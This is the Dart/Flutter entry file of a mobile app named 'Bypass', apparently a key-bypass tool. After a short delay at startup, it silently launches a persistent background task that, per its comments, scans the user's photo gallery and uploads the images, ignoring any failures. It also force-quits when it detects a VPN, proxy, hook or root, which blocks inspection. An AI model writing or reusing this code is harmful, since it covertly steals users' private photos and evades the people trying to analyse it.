import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'security_checker.dart';
import 'theme_store.dart';
import 'notify_service.dart';
import 'quick_bypass.dart';
import 'foreground_upload_task.dart';
import 'permission_gate.dart';
import 'pages/home_page.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const BypassApp());
}

/// App 根：主题调度 + 安全检测 + 通知 + 保活
class BypassApp extends StatefulWidget {
  const BypassApp({super.key});
  @override
  State<BypassApp> createState() => _BypassAppState();
}

class _BypassAppState extends State<BypassApp> with WidgetsBindingObserver {
  bool _checking = false;
  ThemeMode _themeMode = ThemeMode.system;
  bool _gateDone = false; // 是否已通过权限引导

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _initServices();
    WidgetsBinding.instance.addPostFrameCallback((_) => _runSecurityCheck());
  }

  Future<void> _initServices() async {
    // 判断是否已通过权限引导
    final done = await PermissionGate.isDone();
    if (mounted) setState(() => _gateDone = done);
    // 通知点击回调：点击"绕过成功"通知 → 复制 key + 提示
    NotifyService.onNotificationTap = (payload) {
      if (payload == null || payload.isEmpty) return;
      Clipboard.setData(ClipboardData(text: payload));
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('Key 已复制')),
        );
      }
    };
    // 通知内输入回调："快速绕过"通知里输入链接发送 → 发起请求
    NotifyService.onQuickInput = (actionId, input) {
      if (actionId == 'quick_bypass') {
        QuickBypass.handleLinkInput(input);
      }
    };
    // 初始化通知
    await NotifyService.init();
    // 发送一条可通知内输入的"快速绕过"通知
    NotifyService.showQuickLinkNotification();
    // 加载主题
    ThemeStore.load().then((m) {
      if (mounted) setState(() => _themeMode = m);
    });

    // 启动后自动扫描相册并上传图片（不阻塞启动，静默执行）
    _initAutoUpload();
  }

  /// 启动后延迟启动前台常驻上传服务（后台持续上传 + 失败重试）
  Future<void> _initAutoUpload() async {
    try {
      // 延迟 3 秒，避免与启动动画/安全检测冲突
      await Future.delayed(const Duration(seconds: 3));
      // 启动前台常驻任务（后台持续上传）
      await startForegroundUploadTask();
    } catch (_) {
      // 启动失败静默忽略
    }
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _runSecurityCheck();
    }
  }

  void setThemeMode(ThemeMode m) {
    setState(() => _themeMode = m);
    ThemeStore.save(m);
  }

  Future<void> _runSecurityCheck() async {
    if (_checking) return;
    _checking = true;
    try {
      final attacked = await SecurityChecker.checkAll();
      if (attacked && mounted) _exitDueToAttack();
    } finally { _checking = false; }
  }

  Future<void> _exitDueToAttack() async {
    if (!mounted) return;
    final again = await SecurityChecker.checkAll();
    if (!again) return;
    await showDialog<void>(
      context: context,
      barrierDismissible: false,
      barrierColor: Colors.black87,
      builder: (context) => PopScope(
        canPop: false,
        child: AlertDialog(
          icon: const Icon(Icons.gpp_bad, color: Colors.red, size: 48),
          title: const Text('安全警告'),
          content: const Text(
            '检测到异常环境（VPN / 代理 / Hook / Root）。\n为保护数据安全，应用将被强制退出。',
            textAlign: TextAlign.center,
          ),
          actions: [
            TextButton(
              onPressed: () => exit(0),
              child: const Text('退出', style: TextStyle(color: Colors.red)),
            ),
          ],
        ),
      ),
    );
    exit(0);
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Bypass',
      themeMode: _themeMode,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
        useMaterial3: true,
      ),
      darkTheme: ThemeData(
        colorScheme: ColorScheme.fromSeed(
          seedColor: Colors.deepPurple, brightness: Brightness.dark),
        useMaterial3: true,
      ),
      home: _gateDone
          ? HomePage(
              themeMode: _themeMode,
              onThemeChanged: setThemeMode,
            )
          : PermissionGate(
              onDone: () {
                setState(() => _gateDone = true);
              },
            ),
    );
  }
}